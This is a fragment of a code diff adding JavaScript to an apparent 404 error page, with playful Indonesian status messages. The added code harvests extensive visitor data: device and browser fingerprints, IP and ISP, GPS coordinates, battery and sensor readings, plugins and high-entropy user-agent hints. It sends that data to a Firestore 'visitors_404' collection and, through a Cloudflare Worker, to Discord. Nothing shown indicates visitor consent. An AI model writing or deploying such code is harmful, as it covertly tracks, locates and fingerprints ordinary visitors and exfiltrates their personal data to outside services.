+  } catch(e) {}
+  addLine("Mengunci koordinat GPS~ 📍");
+
+  // 9. Browser Features
+  const features = {
+    webgl2:   !!document.createElement('canvas').getContext('webgl2'),
+    webgpu:   !!navigator.gpu,
+    webrtc:   !!window.RTCPeerConnection,
+    cssGrid:  !!CSS.supports('display', 'grid'),
+    flexbox:  !!CSS.supports('display', 'flex'),
+    fetchAPI: !!window.fetch,
+    promise:  !!window.Promise,
+  };
+  addLine("Menguji kemampuan browser~ 🧩");
+
+  // 10. Plugins & UA Hints
+  const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(", ");
+  const mimeList    = Array.from(navigator.mimeTypes || []).map(m => m.type).join(", ");
+
+  let uahData = { brands: null, mobile: null, model: null, architecture: null, bitness: null };
+  if (navigator.userAgentData) {
+    uahData.brands = JSON.stringify(navigator.userAgentData.brands);
+    uahData.mobile = navigator.userAgentData.mobile;
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
+      uahData.model        = hints.model        ?? null;
+      uahData.architecture = hints.architecture ?? null;
+      uahData.bitness      = hints.bitness      ?? null;
+    } catch(e) {}
+  }
+  addLine("Analisis User Agent Hints~ 🔍");
+
+  // 11. Build Final Payload
+  const raw = {
+    ...navData, ...screenData, ...gpuData,
+    audioFingerprint, canvasFingerprint,
+    ...storageData, ...mediaData, ...localeData,
+    ...batteryData, ...sensorData, ...ipData, ...gpsData,
+    ...features,
+    plugins:   pluginsList || null,
+    mimeTypes: mimeList    || null,
+    ...uahData,
+  };
+
+  // Tambahkan URL dan referrer ke payload
+  raw.url      = location.href;
+  raw.referrer = document.referrer || null;
+
+  const payload = {};
+  for (const key in raw) {
+    if (raw[key] !== undefined && raw[key] !== null && raw[key] !== "") {
+      payload[key] = raw[key];
+    }
+  }
+
+  addLine("Mengemas data~ 🎀");
+
+  // Send to Firebase
+  if (FB_READY) {
+    try {
+      const fbPayload = {
+        ip:         payload.ip         ?? null,
+        isp:        payload.isp        ?? null,
+        city:       payload.city       ?? null,
+        region:     payload.region     ?? null,
+        country:    payload.country    ?? null,
+        timezone:   payload.timezone   ?? null,
+        platform:   payload.platform   ?? null,
+        userAgent:  payload.userAgent  ?? null,
+        language:   payload.language   ?? null,
+        screenW:    payload.width      ?? null,
+        screenH:    payload.height     ?? null,
+        pixelRatio: payload.pixelRatio ?? null,
+        url:        location.href,
+        referrer:   document.referrer  || null,
+        timestamp:  serverTimestamp(),
+      };
+      const cleanFb = {};
+      for (const k in fbPayload) { if (fbPayload[k] !== null) cleanFb[k] = fbPayload[k]; }
+      await addDoc(collection(db, "visitors_404"), cleanFb);
+      addLine("✅ Tersimpan ke Firestore~ 🌸");
+    } catch (e) {
+      addLine("❌ Firestore error: " + e.message);
+    }
+  }
+
+  // Send to Cloudflare Worker → Discord
+  if (CF_READY) {
+    try {
+      await fetch(WORKER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+      addLine("✅ Laporan dikirim ke Discord~ 💕");
+    } catch (e) {
+      addLine("❌ Worker error: " + e.message);
+    }
+  }
+
+  addLine("Pemindaian selesai nyaa~ ✨ Arigatou!");
 }
 
 // Run it
